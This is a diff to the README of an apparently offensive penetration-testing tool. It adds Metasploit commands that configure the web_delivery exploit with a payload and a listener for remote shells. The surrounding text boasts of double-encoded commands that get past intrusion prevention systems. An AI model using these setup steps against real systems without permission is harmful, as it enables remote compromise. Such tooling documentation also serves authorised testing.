@@ -116,5 +116,18 @@ PWDUMP
 * The commands are double encoded and bypass current IPS solutions (even next-gen) unless specifically tuned to catch these attacks.  
 * ATEXEC is the only one that currently lands on disk and does not encode, I still have some rewriting to do still.
 
+### Web_delivery attacks
+* To setup Metasploit for the web_delivery exploit start-up Metasploit and configure the exploit to meet the following conditions
+```
+use exploit/multi/script/web_delivery
+set targets 2
+set payload <choose your desired payload>
+set lhost <your IP>
+set lport <port for the shell make sure it is not a conflicting port>
+set URIPATH /
+set SRVPORT <the same as what is set by the -r option in ranger, defaults to 8888>
+exploit -j
+```
+
 ###NMAP
 * The nmap XML feed is still in DRAFT and it is not functioning yet. 
